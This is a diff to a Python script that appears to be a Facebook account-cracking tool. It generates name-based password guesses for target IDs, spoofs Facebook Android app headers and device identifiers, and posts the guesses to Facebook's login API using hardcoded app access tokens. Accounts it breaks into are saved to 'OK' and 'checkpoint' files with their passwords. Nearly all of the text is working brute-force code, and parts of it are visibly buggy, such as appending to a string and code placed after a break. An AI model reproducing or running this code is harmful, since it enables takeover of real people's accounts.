@@ -380,16 +380,8 @@ class crack_main():
                         except:
                                 ln = fn
                         for pw in passlist:
-                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
-                                infos = open('device_info.txt','r').read()
-                                try:
-                                        version_,model_,brand_name_,width_,height_=infos.split('$')
-                                except:
-                                        version_ = str(random.randint(7,13))
-                                        model_ = "Infinix"
-                                        brand_name_ = "Infinix"
-                                        width_ = "720"
-                                        height_ = "1280"
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                         fbbv = str(random.randint(111111111,999999999))
                         android_version = device['android_version']
@@ -407,8 +399,7 @@ class crack_main():
                         fbrv = '0'
                         fban = 'FB4A'
                         fbpn = 'com.facebook.katana'
-                        uas = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
+                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -421,29 +412,60 @@ class crack_main():
                         li2 = random.choice(li)
                         j1 = ''.join(random.choice(digits) for _ in range(2))
                         jazoest = li2+j1
-                        head = {'Connection': 'keep-alive', 'Authorization':f'OAuth {accessToken}', 'Host': 'https://b-api.facebook.com/method/auth.login', 'X-FB-Friendly-Name':'authenticate', 'X-FB-Connection-Type':'unknown', 'User-Agent':uas, 'Accept-Encoding':'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
-                        data = {'adid':adid,'format':'json','device_id':device_id,'email':ids,'password':pas,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','meta_inf_fbmeta':'','currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate',}
-                        po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
-                                #print(po,hdata)ata)
-                        try:
-                                roid = str(po['uid'])
-                        except:
-                                roid = iid
+                        data = {
+                                'adid':adid,
+                                'format':'json',
+                                'device_id':device_id,
+                                'email':ids,
+                                'password':pas,
+                                'generate_analytics_claims':'1',
+                                'credentials_type':'password',
+                                'source':'login',
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'meta_inf_fbmeta':'',
+                                'currently_logged_in_userid':'0',
+                                'fb_api_req_friendly_name':'authenticate',
+                        }
+                        headers={
+                                'Authorization':f'OAuth {accessToken}',
+                                'X-FB-Friendly-Name':'authenticate',
+                                'X-FB-Connection-Type':'unknown',
+                                'User-Agent':ua,
+                                'Accept-Encoding':'gzip, deflate',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'X-FB-HTTP-Engine': 'Liger'
+                                }
+                        url = 'https://b-api.facebook.com/method/auth.login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
-                                open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
-                                ok.append(iid)
-                                break
-                        elif 'Please Confirm Email' in po:
-                                print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
-                                open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
-                                ok.append(iid)
-                                break
+                                        print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
+                                        break
+                        elif twf in str(po):
+                                        if 'y' in pcp:
+                                                print('\r\r \033[1;34m[AKING-2F] '+ids+' | '+pas)
+                                                twf.append(ids)
+                                                break
+                        elif 'www.facebook.com' in po['error_msg']:
+                                        if 'y' in pcp:
+                                                print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/AKING-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                                        else:
+                                                open('/sdcard/AKING-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
                         else:
                                 continue
-                 loop+=1
-         except Exception as e:
-                 pass
+                loop+=1
+        except Exception as e:
+                pass
                         #print(e)
 
         def pasw(self):
